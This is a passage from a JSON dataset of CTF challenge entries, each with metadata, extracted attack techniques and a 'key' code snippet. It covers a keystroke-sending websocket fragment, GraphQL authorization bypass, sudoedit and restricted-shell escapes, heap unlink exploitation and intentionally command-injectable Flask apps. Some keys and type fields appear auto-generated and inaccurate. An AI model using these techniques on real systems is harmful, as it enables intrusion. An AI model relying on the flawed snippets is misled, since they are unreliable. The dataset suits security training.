ws.send(encode(message, key));  \n   key2 = key.split(\"\");  \n   shuffle(key2, rand(hash(message)));  \n   key2 = key2.join(\"\");  \n });\n\n Array.from(document.getElementsByTagName(\"input\")).forEach(function(e) {  \n   e.addEventListener(\"keyup\", function(v) {  \n     ws.send(encode(Math.random().toString().slice(2) + \" \" + v.key, key2));  \n   }, false);  \n });\n\n}, false);\n```"
    },
    {
        "name": "Looking Inwards",
        "write_up": "dataset/raw/Looking Inwards.md",
        "type": "web",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 300,
        "max_score": 550,
        "difficulty": 0.5454545454545454,
        "knowledge": [
            "In GraphQL API CTF challenges, one can utilize introspection queries to discover hidden or undocumented endpoints and their schemas, including types, queries, mutations, and subscriptions. This is particularly effective when documentation is lacking or when exploring the API for vulnerabilities. Example introspection query snippet:\n```  \n{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}\n```",
            "After identifying a hidden or specific endpoint through introspection in a GraphQL API, construct a query to exploit or interact with that endpoint based on its expected arguments and return types. In scenarios where an endpoint expects a boolean to grant access (e.g., an \"authorized\" argument), directly setting this argument to `true` in the query may bypass security controls and reveal sensitive information or the flag. Example query for exploiting a discovered endpoint:\n```  \nquery {  \n   super_super_secret_flag_dispenser(authorized: true)  \n}\n```"
        ],
        "key": "```graphql\n{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types { ...FullType }\n    directives {\n      name\n      description\n      locations\n      args { ...InputValue }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args { ...InputValue }\n    type { ...TypeRef }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields { ...InputValue }\n  interfaces { ...TypeRef }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes { ...TypeRef }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type { ...TypeRef }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```"
    },
    {
        "name": "Lord Saturday",
        "write_up": "dataset/raw/Lord Saturday.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 286,
        "max_score": 299,
        "difficulty": 0.9565217391304348,
        "knowledge": [
            "When facing restrictions on executing certain binaries due to missing files or permissions, creating a symbolic link (symlink) to another binary with similar capabilities can bypass this restriction. This approach is especially useful in scenarios where the behavior of the linked binary changes based on the value of `argv[0]`. For instance, replicating a missing `/usr/bin/sudoedit` by creating a symlink to `/usr/bin/sudo` can retain `sudoedit` functionality. This technique can be applied universally in scenarios where the binary's behavior is flexible based on its invocation name.\n    - Example command to create symlink: `ln -s /usr/bin/sudo /home/ctf/sudoedit`",
            "In environments where internet access is restricted or certain utility programs like `curl`, `wget`, or `nc` are unavailable, transferring files (e.g., exploit binaries) can be accomplished via encoding and manual transmission. First, encode the binary file with `base64` on a local system. Then, on the target system, decode it using `base64 -d`. This process allows for the manual transfer of files even when direct file transfer mechanisms are blocked. Compiling the exploit in the same environment as the target (e.g., a Docker image) ensures compatibility, particularly with complex libraries like libc.\n    - Example command to encode and transmit a file manually:\n        - Local system: `base64 exploit_binary > exploit_base64.txt`\n        - Remote system: `cat exploit_base64.txt | base64 -d > exploit_binary`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    char *args[] = {\"/usr/bin/sudo\", \"edit\", NULL};\n    char *env[] = {NULL};\n\n    if (argc > 1) {\n        args[1] = argv[1];\n    }\n\n    execve(\"/usr/bin/sudo\", args, env);\n    perror(\"execve\");\n    return 1;\n}\n```"
    },
    {
        "name": "Lost In Transmission 2",
        "write_up": "dataset/raw/Lost In Transmission 2.0.md",
        "type": "misc",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": -1.0,
        "max_score": 625,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving encrypted or coded messages, it is crucial to identify patterns within the data for decoding. If a sequence appears repeatedly, it could act as a delimiter or a key indicator of how the data was encoded. After identifying a repeating pattern, separating the data using this pattern may reveal encoded information in a recognizable format, such as Morse code or, as in this case, another encoding scheme named \"Bain\".",
            "When encountering data that resembles a known encoding format (like Morse code) after initial translation or substitution, but does not decode into intelligible text, consider the possibility of an alternative encoding scheme or cipher being used. In situations where Morse code or similar does not yield results, exploring other encoding schemes, including less common or bespoke ones (Bain in this scenario), may be necessary to decrypt the message and find the flag."
        ],
        "key": "```python\ndef decode_transmission(transmission):\n    # Convert F to '.' and D to '-'\n    morse_code = transmission.replace('F', '.').replace('D', '-')\n    \n    # Replace the identified delimiter pattern with a space\n    morse_code_with_spaces = morse_code.replace('--..-.', ' ')\n    \n    return morse_code_with_spaces\n\ntransmission = \"FDFDDDFFDFDDFDDDDFFDFDDFDDFFDFDFFDDFFDFFDDFFDFDDDDDDFFDFDDFFDDFFDFFDDDFFDFFFFFFDDFFDFDDDDDDFFDFDDDDFFDFDDDFFDFDFDDFFDFDDFDDFFDFDDDDDDFFDFFDFDDFFDFFDDDFFDFFFDDDDFFDFFFFDDDDFFDFDDDDDDFFDFFFFFDDFFDFFDDDFFDFFFFFFDDFFDFDFFFDDFFDFDDDDDDFFDFDDDDFFDFFFFDDDDFFDFFDDDFFDFDDFDDFFDFDDDDDDFFDFDFFDDFFDFDDDFFDFDDDDDDFFDFFFDDDDFFDFDDFDDDDFFDFDDFFDDFFDFDDDDDDFFDFFFFFDDFFDFFFFDDDDFFDFDFFFDDFFDFDFFDDFFDFDDDDDDFFDFDFFFDDFFDFDDFDDFFDFDDDDFFDFDDDDDDFFDFFDFDDFFDFFDDDFFDFFFDDFFDFFFDDDDFFDF\"\ndecoded_message = decode_transmission(transmission)\nprint(decoded_message)\n```"
    },
    {
        "name": "Lost Modulus",
        "write_up": "dataset/raw/Lost Modulus.md",
        "type": "crypto",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To recover the public key modulus (`n`) in an encryption system without knowing the public key, utilize an encryption-decryption oracle. Begin by encrypting a large number and decrypt it; if the result is truncated (i.e., modulo `n` operation occurs), it indicates that the encrypted number is greater than `n`. This method can systematically identify the maximum value of `n`, bit by bit, starting from the most significant bit. This approach is especially effective in scenarios where only a limited number of oracle interactions are permitted. A practical implementation involves encrypting powers of two decremented from a high bit size until a change in the decrypted output is observed, signifying the upper limit for `n`.\n\n```python\n# Example for iterating over bits to find the highest set bit of n\nfor bit in range(bitsize - 1, -1, -1):\n    payload = 2 ** bit\n    e = encrypt(long_to_bytes(payload))\n    result = decrypt(e)\n    if result != '00':  # Change detected, indicating upper bound for n\n        start_bit = bit\n        break\n```",
            "Paillier cryptosystem's homomorphic properties can be exploited to recover encrypted messages byte-by-byte. Given the Paillier cryptosystem's nature, one can perform operations on ciphertexts that directly translate to operations on the plaintexts. For example, to shift the decrypted message and recover it byte by byte, you can manipulate the ciphertext by subtracting the value of the last byte (making the plaintext end with `\\x00`) and divide the value by 256 (effectively shifting the plaintext). This process relies on manipulating ciphertext using operations allowed by Paillier's homomorphism, such as multiplication by a constant (to achieve division in plaintext) and adding or subtracting a value from the plaintext.\n\n```python\n# Example of shifting the decrypted message to recover it byte by byte\ndivisor = modinv(256, n)  # Modular inverse for division operation\nfor i in range(length_of_message):  \n    last_byte = decrypt(encrypted_message)  # decrypt to get last byte\n    modified_message = (encrypted_message * paillier_encrypt(n - ord(last_byte), n) % (n**2)\n    encrypted_message = pow(modified_message, divisor, n**2)  # shift message\n```"
        ],
        "key": "```python\nfor bit in range(bitsize - 1, -1, -1):  \n    payload = 2 ** bit  \n    e = enc(long_to_bytes(payload)).decode(\"hex\")  \n    result = dec(e)  \n    if result == '00':  \n        start_bit = bit  \n        break  \n\npayload = 2 ** start_bit  # 100000...  \nfor bit in range(start_bit - 1, 7, -1):  \n    payload ^= 2 ** bit  \n    print(bin(payload))  \n    e = enc(long_to_bytes(payload)).decode(\"hex\")  \n    result = dec(e)  \n    if result != '00':  # didn't work, set the bit back to 0  \n        payload ^= 2 ** bit  \n\ntoo_large = payload ^ 0xff  \ne = enc(long_to_bytes(too_large)).decode(\"hex\")  \nresult = int(dec(e), 16)  \nfor i in range(256):  \n    potential_n = payload ^ i  \n    mod = too_large % potential_n  \n    if mod == result:  \n        return potential_n  \n```"
    },
    {
        "name": "LovR",
        "write_up": "dataset/raw/LovR.md",
        "type": "misc",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 454,
        "max_score": 482,
        "difficulty": 0.941908713692946,
        "knowledge": [
            "In a challenge involving games or applications where progression is tracked through in-game variables (such as levels, points, or time limits), Cheat Engine can be effectively used to manipulate these variables to bypass limitations or reach certain game states. To do this, identify and scan for the in-game variable (like a score or level) using Cheat Engine, adjusting the scan type based on the variable's data type (e.g., Double, Integer). After finding the correct address, modify its value to achieve the desired effect, such as progressing to the next level or unlocking features. This approach requires trial and error to identify the correct data type and value.",
            "In challenges where clues or flags are hidden within rapidly changing or obscured visual elements, extracting and analyzing these visual clues can be achieved through recording the screen and using image processing techniques. Specifically, if a piece of information is displayed across two frames or images with a noisy background, capturing before and after frames and applying the XOR operation between these images can reveal the obscured text or clue. This technique leverages the principle that XORing two images can cancel out common elements (like a static background), highlighting differences (such as the appearance of text). This approach can be used to decipher hidden messages or clues in a variety of CTF challenges involving visual data manipulation.\n\nSample of payload for knowledge extraction in point 2 (XOR process) cannot be directly provided due to the nature of the operation requiring specific image data."
        ],
        "key": "```python\nclass GameLevel:\n    def __init__(self):\n        self.goal = 1250  # Vulnerable variable\n\n    def pass_level(self):\n        if self.goal <= 0:\n            print(\"Level Passed!\")\n        else:\n            print(\"Keep trying!\")\n\n# Example of vulnerability exploitation\ngame = GameLevel()\ngame.goal = 0  # Cheat Engine used to modify this value\ngame.pass_level()\n```"
    },
    {
        "name": "Lucky Numbers",
        "write_up": "dataset/raw/Lucky Numbers.md",
        "type": "This CTF challenge falls under the category of \"crypto\".",
        "competition": [
            "Hack.lu/2023",
            "https://ctftime.org/event/1921/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When a challenge involves numeric constraints and mathematical operations, rather than attempting to solve the constraints or operations manually, automate the process by writing a script that tries all possible valid combinations within given constraints. For example, if given a range for a variable, use a for-loop to iterate through all possible values within this range to find valid ones.  \nExample Payload:  \n```python\nfor t in range(43):  \n   n=2**t-1  \n   sent=False  \n   for i in range(2,int(n**0.5)+1):  \n       if (n%i) == 0:  \n           sent = True  \n           break  \n   if not sent:  \n       print(f\"{t}: Worked!\")  \n```",
            "In scenarios involving finding specific pairs of numbers that satisfy both a mathematical relation and a property (like being a \"lucky number\"), if one of the variables is solved or constrained by previous operations (e.g., finding valid `t` values based on a mathematical condition), iterate over the solved set of values to calculate and validate the pairs. This reduces the problem complexity significantly, allowing for a more direct solution by reusing the structure of the challenge's own logic.  \nExample Payload:  \n```python\nts = [1, 2, 3, 5, 7, 13, 17, 19, 31]  \nfor t in ts:  \n   A = []  \n   u=t-1  \n   number=(2**u)*(2**(t)-1)  \n   s = number  \n   sqrt_num=math.isqrt(s)  \n   for i in range(1,sqrt_num+1):  \n       if s%i==0:  \n           A.append(i)  \n           if i!=s//i and s//i!=s:  \n               A.append(s//i)        \n   total=sum(A)  \n   if total==s==number:  \n       print(f\"t - {t}, s - {s}: solved!\")  \n```"
        ],
        "key": "```python\ns=int(data2)  \nt=int(data3)  \nif s<random.randrange(10000,20000):  \n    print(\"I have the feeling the first number might be too small\")  \n    continue  \nif s>random.randrange(150000000000,200000000000):  \n    print(\"I have the feeling the first number might be too big\")  \n    continue  \nif t>42:  \n    print(\"I have the feeling the second number might be too big\")  \n    continue  \n\nn=2**t-1  \nsent=False  \nfor i in range(2,int(n**0.5)+1):  \n    if (n%i) == 0:  \n        print(\"The second number didn't bring me any luck...\")  \n        sent = True  \n        break  \nif sent:  \n    continue  \n\nu=t-1  \nnumber=(2**u)*(2**(t)-1)  \nsqrt_num=math.isqrt(s)  \nfor i in range(1,sqrt_num+1):  \n    if s%i==0:  \n        A.append(i)  \n        if i!=s//i and s//i!=s:  \n            A.append(s//i)        \ntotal=sum(A)  \nif total==s==number:  \n    # print flag  \n```"
    },
    {
        "name": "lunch-with-the-cia",
        "write_up": "dataset/raw/lunch-with-the-cia.md",
        "type": "This write-up describes a dynamic programming approach for solving a problem involving repeatedly cutting a bar of chocolate into specific shapes with minimal waste. The given solution involves computing all possible cutting heights and widths, then iteratively finding the best solution for subpieces using memoization.\n\nBased on the content provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 491,
        "max_score": 493,
        "difficulty": 0.9959432048681541,
        "knowledge": [
            "In optimization challenges, especially those involving minimizing waste or maximizing some value within constraints, Dynamic Programming (DP) is a powerful approach to avoid recomputation of solutions for subproblems. Memoization is a specific technique used in DP to store the results of expensive function calls and return the cached result when the same inputs occur again. This makes DP particularly useful in problems where the solution to a problem depends on solutions to smaller subproblems.",
            "For challenges involving combinatorial optimization, such as cutting objects (e.g., chocolate bars) into smaller parts with specific constraints (like minimizing waste while ensuring the resultant pieces match given dimensions), a precomputation strategy to identify all valid cut dimensions beforehand can dramatically reduce the complexity of the solution space. This involves marking feasible cut dimensions based on the input constraints and then iterating through these dimensions to find an optimal solution for dividing the object into the desired forms.\n   \n    Example of precomputing valid dimensions (pseudocode):\n    ```\n    // psuedocode for finding all valid cut heights\n    valid_cut_heights = array of Boolean initialized to false with length = total_height + 1\n    valid_cut_heights[0] = true  // base case: no height is a valid cut\n    \n    for each rectangle_height in given_rectangles:\n        for i from 0 to max_height - rectangle_height:\n            if valid_cut_heights[i] is true:\n                valid_cut_heights[i + rectangle_height] = true\n    ```\n    \n    The above pseudo code captures the essence of marking heights that can be achieved by summing the heights of the given rectangles, thereby identifying all heights at which a cut could be made without wasting material outside the constraints of the given shapes."
        ],
        "key": "```cpp\nll solve(ll r, ll c) {  \n\t// dp is our array. dp[x][y] holds the best value for piece with size x * y (best = minimal waste)  \n\t// currently, the best option we know is wasting everything:  \n\tfor (ll x = 1; x <= r; x++) for (ll y = 1; y <= c; y++) {  \n\t\tdp[x][y] = x * y;  \n\t}  \n\t// All pieces matching the rectangles perfectly have zero waste:  \n\tfor (pll p : fs) dp[p.first][p.second] = 0;  \n\t// Now compute the minimal waste for each possible dimension (x * y)  \n\tfor (ll x = 1; x <= r; x++) for (ll y = 1; y <= c; y++) {  \n\t\t// Try all possible vertical cuts  \n\t\tfor (ll w : cutws) {  \n\t\t\tif (w > y) break; // cutting more than we have  \n\t\t\t// dp[x][y-w] is the best option for the right side (we already computed this and stored it in dp)  \n\t\t\t// dp[x][w] is the best option for the left side (we already computed this and stored it in dp)  \n\t\t\tdp[x][y] = min(dp[x][y], dp[x][y-w] + dp[x][w]);  \n\t\t}  \n\t\t// Try all possible horizontal cuts  \n\t\tfor (ll h : cuths) {  \n\t\t\tif (h > x) break;  \n\t\t\tdp[x][y] = min(dp[x][y], dp[h][y] + dp[x-h][y]);  \n\t\t}  \n\t}  \n\treturn dp[r][c];  \n}  \n```"
    },
    {
        "name": "MaaS",
        "write_up": "dataset/raw/MaaS.md",
        "type": "crypto",
        "competition": [
            "n00bzCTF/2023",
            "https://ctftime.org/event/1895/tasks/"
        ],
        "score": 410,
        "max_score": 498,
        "difficulty": 0.8232931726907631,
        "knowledge": [
            "When facing challenges involving modulo operations with input manipulation for guessing secret strings, identify if a constant input can be found that yields unique remainders when modulo is taken with all possible character ASCII values. This strategy allows for mapping of remainders to characters. If unique remainders can be obtained for all characters, this input can be used universally across multiple attempts to decipher the encoded message. Specifically, an approach to find such a constant involves iterating over a range of numbers and checking their modulo with possible character ASCII values to see if all remainders are unique. This is particularly useful in scenarios where input is left-shifted (or multiplied by a power of 2) before being modulo-ed with character ASCII values.\n   \n   Example payload approach: Iterate over a number range to find a constant `g` such that `(g << 16) % ord(character)` yields unique remainders for all characters in a given set (e.g., uppercase alphabet).",
            "In scenarios where a limited number of guesses can be made to identify secret strings encoded via modulo operations, leveraging multiple guesses to obtain a set of remainders for each character can establish uniqueness. This is based on the observation that each character can yield different remainders under the same operation but altered input conditions. This can circumvent potential collisions that may occur if relying on a single remainder per character approach. The knowledge of obtaining several outputs for the same character via different guesses allows for a more granular mapping from remainders to characters, thereby decoding messages more accurately in services or challenges that provide limited interaction opportunities.\n\n   Example application: Utilize the 3 guesses allowed per character to send different numbers and collect their modulo remainders when divided by each character's ASCII. Map these remainers back to the characters to figure out the secret string with higher precision compared to using a single remainder per character."
        ],
        "key": "```python\n#!/usr/bin/python3  \nimport random  \nfrom Crypto.Util.number import *  \nflag = open('flag.txt').read()  \nalpha = 'abcdefghijklmnopqrstuvwxyz'.upper()  \nto_guess = ''  \nfor i in range(16):  \n\tto_guess += random.choice(alpha)  \nfor i in range(len(to_guess)):  \n\tfor j in range(3):  \n\t\tinp = int(input(f'Guessing letter {i}, Enter Guess: '))  \n\t\tguess = inp << 16  \n\t\tprint(guess % ord(to_guess[i]))  \nlast_guess = input('Enter Guess: ')  \nif last_guess == to_guess:  \n\tprint(flag)  \nelse:  \n\tprint('Incorrect! Bye!')  \n\texit()  \n```"
    },
    {
        "name": "Machbook",
        "write_up": "dataset/raw/Machbook.md",
        "type": "pwn",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting heap-based vulnerabilities in OSX's Small Heap mechanism, it's crucial to understand the heap structure, specifically for forging a fake heap structure for an unlink attack. Unlike glibc's unsafe unlink, OSX requires the previous pointer at `ptr` and the next pointer at `ptr+0x10`. Additionally, calculating a valid checksum is mandatory as an invalid one will terminate the program. The checksum formula is `SumOfEveryBytes(ptr ^ small-rack-cookie ^ small-rack-ptr)`, necessitating knowledge of internal heap metadata (small-rack-cookie and small-rack-ptr) for successful exploitation.",
            "Arbitrary write in OSX heap exploitation scenarios, such as the mentioned challenge, can be achieved by leveraging the unsafe unlink technique with checksum protection. This involves forging a fake heap structure to overwrite pointers of interest (e.g., user struct pointers) to control program execution flow or manipulate function pointers for remote code execution (RCE). An important strategy to ensure the reliability of heap exploits, especially in multi-core systems where allocations might not occur in the expected heap region (Magazine), is to iteratively allocate memory until it appears in the desired region. This can be facilitated by arbitrary read capabilities to check the location of allocated heap chunks."
        ],
        "key": "```c\nvoid replace_backslash(char *name) {\n    for (int i = 0; i < strlen(name); i++) {\n        if (name[i] == '\\\\') {\n            name[i] = '\\\\\\\\'; // This causes buffer overflow\n        }\n    }\n}\n```"
    },
    {
        "name": "Machine Trouble",
        "write_up": "dataset/raw/Machine Trouble.md",
        "type": "misc",
        "competition": [
            "Pearl/2024",
            "https://ctftime.org/event/2231/tasks/"
        ],
        "score": 472,
        "max_score": 500,
        "difficulty": 0.944,
        "knowledge": [
            "When dealing with programming challenges involving Finite State Machines (FSMs) in CTFs, especially ones that allow for creation or modification of states and transitions, understanding the mechanics of DFA (Deterministic Finite Automata) and the strategy of excluding certain characters ('~l') or including all characters ('@') to transition between states is crucial. This approach can be employed to discern hidden or restricted characters in a given string, flag, or input by systematically excluding known undesirable characters or including potential candidates.\n   \n    Sample payload construction method:\n    ```python\n    # Construct transitions that exclude a specific character 'l'\n    t = [\"\".join([str(i), ' ~l ', str(i+1)]) for i in range(length-1)]\n    ```",
            "Automating the testing process for string extraction in CTF challenges by crafting payloads dynamically based on feedback from the challenge (e.g., indication of a correct state transition or trapping state) can significantly enhance the efficiency of finding the correct string or flag. This applies especially to scenarios where the flag or critical string is verified character by character, or a series of condition checks are performed sequentially. The strategy involves iteratively adjusting the payload based on the outcome of each attempt, progressively narrowing down to the valid characters or sequence.\n\n    Example approach to automate character testing:\n    ```python\n    whitelist = \"_acdefhk\"  # Based on derived or guessed valid characters\n    for pos in range(string_length):  \n        for char in whitelist:  \n            payload = crafted_payload_function(char, pos)  # Function to craft payload based on position and char\n            response = send_payload_to_challenge(payload)  # Function to interact with the challenge\n            if response_indicates_success(response):  \n                result += char  \n                break\n    ```\nThese methods underline the importance of understanding CTF challenge mechanics, incorporating programming techniques for automation, and iteratively refining approaches based on dynamic feedback."
        ],
        "key": "```python\nimport time  \nimport socket\n\nclass Netcat:  \n    \"\"\" Python 'netcat like' module \"\"\"\n\n    def __init__(self, ip, port):  \n        self.buff = \"\"  \n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \n        self.socket.connect((ip, port))\n\n    def read(self, length=1024):  \n        \"\"\" Read 1024 bytes off the socket \"\"\"  \n        return self.socket.recv(length)\n\n    def read_until(self, data):  \n        \"\"\" Read data into the buffer until we have data \"\"\"  \n        while data not in self.buff:  \n            self.buff += self.socket.recv(1024).decode(\"ascii\")\n\n        pos = self.buff.find(data)  \n        rval = self.buff[:pos + len(data)]  \n        self.buff = self.buff[pos + len(data):]\n\n        return rval\n\n    def write(self, data):  \n        self.socket.send(data)\n\n    def close(self):  \n        self.socket.close()\n\ndef crafted(f=None, position=None):  \n    result = \"\"  \n    length = 11  \n    t = [\"\".join([str(i), ' @ ', str(i+1)]) for i in range(length-1)]  \n    if f is not None:  \n        if position is not None:  \n            t[position] = \"\".join([str(position), f' ~{f} ', str(position+1)])  \n        else:  \n            t = [\"\".join([str(i), f' ~{f} ', str(i+1)])  \n                 for i in range(length-1)]\n\n    T = len(t)  \n    S = len(t) + 1  \n    f = [S - 1]\n\n    result += str(S) + '\\n'  \n    result += \" \".join([str(i) for i in f]) + '\\n'  \n    result += str(T) + '\\n'  \n    for line in t:  \n        result += line + '\\n'  \n    return result\n\n# whitelist = \"_acdefhk\"  \nfor i in 'abcdefghijklmnopqrstuvwxyz':  \n    s = Netcat('dyn.ctf.pearlctf.in', 30018)\n\n    data = bytes(crafted(i), 'ascii')  \n    s.write(data)  \n    time.sleep(3)  \n    buf = s.read()  \n    buf = s.read()  \n    print(i, buf[-2])  \n    s.close()  \n```"
    },
    {
        "name": "Made Functional",
        "write_up": "dataset/raw/Made Functional.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing a restricted shell environment where direct execution of common binaries is not possible due to path restrictions, look for built-in shell commands that can be repurposed to achieve the intended outcome. Specifically, in a bash environment with `$PATH` unset or restricted, bypassing execution limitations to read file contents can be achieved through creative use of bash built-ins like `source`. This approach relies on the side-effect of errors thrown by the `source` command when attempting to execute the contents of a file not meant to be run as a script, effectively leaking its contents.  \n   Example Payload: `source flag.txt`",
            "In scenarios where direct file content disclosure methods (like `cat`) are blocked by restrictions, and indirect methods must be employed, circumventing these restrictions often requires a deep understanding of the environment's capabilities and limitations. In this case, knowledge of bash's behaviors and built-in commands becomes crucial. Leveraging error messages or unintended command outputs is a viable strategy to extract sensitive information or file contents. This technique can be universally applied in similar restricted environments, where direct methods are not feasible but indirect command execution can lead to successful information disclosure.  \n   Application Condition: Applicable in environments where error outputs or the behavior of built-ins can be observed or controlled."
        ],
        "key": "```python\nfrom flask import Flask, request, jsonify\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute():\n    data = request.json\n    recipe = data.get('recipe', '')\n\n    # Vulnerable code: directly executing user input\n    try:\n        result = subprocess.run(['make', '-f', '-'], input=recipe, text=True, capture_output=True)\n        return jsonify({'stdout': result.stdout, 'stderr': result.stderr})\n    except Exception as e:\n        return jsonify({'error': str(e)})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n```"
    },
    {
        "name": "Made Harder",
        "write_up": "dataset/raw/Made Harder.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with restrictions in a command execution environment (like a shell or a specific language interpreter), which only allow for the use of special characters, leveraging the features of the available language can bypass the restriction. In the context of a GNU Make jail restricting input to special characters, GNU Make's Automatic Variables (`$@` for the target name and `$<` for the first prerequisite) can substitute direct command input. This approach allows for command execution (e.g., reading files) without needing alphanumeric characters.\n   - Example payload in GNU Make format: \n   ```\n   cat: flag.txt\n   \\t$@ $<\n   ```",
            "Understanding the built-in features of languages or tools (like GNU Make's Automatic Variables) is vital for crafting solutions that work within imposed limitations. Specialized knowledge of how these features work can turn seemingly restrictive conditions into an advantage, especially in scenarios where direct interaction with a system or direct command execution is limited or filtered."
        ],
        "key": "```python\nfrom flask import Flask, request, jsonify\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute():\n    data = request.json\n    recipe = data.get('recipe', '')\n\n    # Vulnerable code: directly using user input in a shell command\n    process = subprocess.Popen(['make', '-f', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate(input=recipe.encode())\n\n    return jsonify({'stdout': stdout.decode(), 'stderr': stderr.decode()})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n```"
    },
    {
        "name": "Made Sense",
        "write_up": "dataset/raw/Made Sense.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with server-side filtering or restrictions on input characters in command execution environments (such as when restricted keywords like \"flag\" are filtered), look for alternative ways to execute commands without using the prohibited words directly. In the context of a restricted shell or sandbox environment where direct references to target files or commands are blocked, using wildcards (e.g., `*`) can be an effective method to bypass these restrictions. An example of bypassing a filter to read files without using the word \"flag\" directly: `cat *.txt`.",
            "Regular expressions (regex) are commonly used to validate user input in web applications. Understanding the pattern being used for validation can reveal potential avenues for bypassing the security measures. When a regex pattern (e.g., `re.fullmatch(r'[A-Za-z0-9]+', target_name)`) restricts input to alphanumeric characters for a specific field and blocks newline characters and certain keywords in another field, injecting commands that conform to these patterns can bypass the input validation. In scenarios where multiline input or certain keywords are restricted, focusing on crafting payloads that remain within a single line and avoid directly using filtered terms can be critical. For scenarios requiring the execution of commands, an effective bypass might not involve directly inserting characters or strings that are explicitly filtered (like breaking out of restricted patterns without using newline characters or restricted keywords)."
        ],
        "key": "```python\nimport os  \nfrom pathlib import Path  \nimport re  \nimport subprocess  \nimport tempfile\n\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)  \nflag = open('flag.txt').read()\n\ndef write_flag(path):  \n   with open(path / 'flag.txt', 'w') as f:  \n       f.write(flag)\n\ndef generate_makefile(name, content, path):  \n   with open(path / 'Makefile', 'w') as f:  \n       f.write(f\"\"\"  \nSHELL := /bin/bash  \n.PHONY: {name}  \n{name}: flag.txt  \n\\t{content}  \n\"\"\")\n\n@app.route('/', methods=['GET'])  \ndef index():  \n   return send_file('index.html')\n\n@app.route('/src/', methods=['GET'])  \ndef src():  \n   return send_file(__file__)\n\n# made sense  \n@app.route('/make', methods=['POST'])  \ndef make():  \n   target_name = request.form.get('name')  \n   code = request.form.get('code')\n\n   print(code)  \n   if not re.fullmatch(r'[A-Za-z0-9]+', target_name):  \n       return 'no'  \n   if '\\n' in code:  \n       return 'no'  \n   if re.search(r'flag', code):  \n       return 'no'\n\n   with tempfile.TemporaryDirectory() as dir:  \n       run_dir = Path(dir)  \n       write_flag(run_dir)  \n       generate_makefile(target_name, code, run_dir)  \n       sp = subprocess.run(['make'], capture_output=True, cwd=run_dir)  \n       return f\"\"\"  \n<h1>stdout:</h1>  \n{sp.stdout}  \n<h1>stderr:</h1>  \n{sp.stderr}  \n   \"\"\"\n\napp.run('localhost', 8000)  \n```"
    },
    {
        "name": "Made With Love",
        "write_up": "dataset/raw/Made With Love.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving a restricted shell environment where common binaries are inaccessible due to an empty `$PATH`, one can utilize the GNU Make's implicit rules and variables to execute commands. This approach leverages `make` capabilities to bypass the lack of direct access to shell utilities like `cat`. Example approach in GNU Make: define a target with a recipe that uses automatic variables such as `$@` (the target name) and `$<` (the name of the first prerequisite) to craft a command that can echo or manipulate files, acting as a workaround. This method capitalizes on the fact that GNU Make does not require direct shell access to binaries for certain operations, thus circumventing the restrictions imposed by the empty `$PATH`.",
